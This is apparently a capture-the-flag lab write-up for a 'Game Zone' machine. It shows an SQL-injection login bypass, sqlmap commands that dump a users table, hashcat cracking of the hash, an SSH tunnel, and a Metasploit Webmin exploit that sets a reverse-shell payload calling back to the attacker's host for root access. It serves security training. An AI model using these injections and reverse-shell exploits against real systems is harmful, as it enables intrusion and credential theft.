# Game Zone

```bash
nmap 10.10.249.76
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-00-46.png>)

## :syringe: Obtain access via SQLi

### What is the name of the large cartoon avatar holding a sniper on the forum?

{% embed url="https://hitman.fandom.com/wiki/Category:Hitman:_Contracts_characters" %}

### When you've logged in, what page do you get redirected to?

```
' or 1=1 -- -
```

* The last dash is suppose to keep the space&#x20;

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-13-46.png>)

## :map: Using SQLMap

### In the users table, what is the hashed password?

```
sqlmap --data 'searchitem=' -p searchitem -u http://10.10.249.76/portal.php \
       --cookie 'PHPSESSID=s0s9dmej46qkstaqrh40uv04o6' --dbms mysql --dbs

sqlmap --data 'searchitem=' -p searchitem -u http://10.10.249.76/portal.php \
       --cookie 'PHPSESSID=s0s9dmej46qkstaqrh40uv04o6' --dbms mysql -D db --tables

sqlmap --data 'searchitem=' -p searchitem -u http://10.10.249.76/portal.php 
       --cookie 'PHPSESSID=s0s9dmej46qkstaqrh40uv04o6' --dbms mysql -D db 
       -T users --dump
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-29-26.png>)

### What was the username associated with the hashed password?

{% hint style="success" %}
agent47
{% endhint %}

### What was the other table name?

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-30-27.png>)

## Cracking a password with JohnTheRipper

### What is the de-hashed password?

```bash
echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > sha256.txt
hashcat -a 0 -m 1400 sha256.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-39-28.png>)

### What is the user flag?

```bash
ssh agent47@10.10.249.76 cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-40-41.png>)

## :hole: Exposing services with reverse SSH tunnels

### How many TCP sockets are running?

```
netstat -ntlp
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-49-03.png>)

### What is the name of the exposed CMS?

```
ssh -NfL 10000:localhost:10000 agent47@10.10.32.65
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-55-53.png>)

### What is the CMS version?

![](<../../.gitbook/assets/Screenshot from 2020-09-11 09-56-15.png>)

## :skull\_crossbones: Privilege Escalation with Metasploit

### What is the root flag?

```bash
msfconsole -q
msf > search webmin 1.580
msf > use 4
msf > set RHOSTS 127.0.0.1
msf > set USERNAME agent47
msf > set PASSWORD videogamer124
msf > set SSL false
msf > set payload cmd/unix/reverse
msf > set LHOST 10.9.101.193
msf > exploit
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-11 14-20-31.png>)
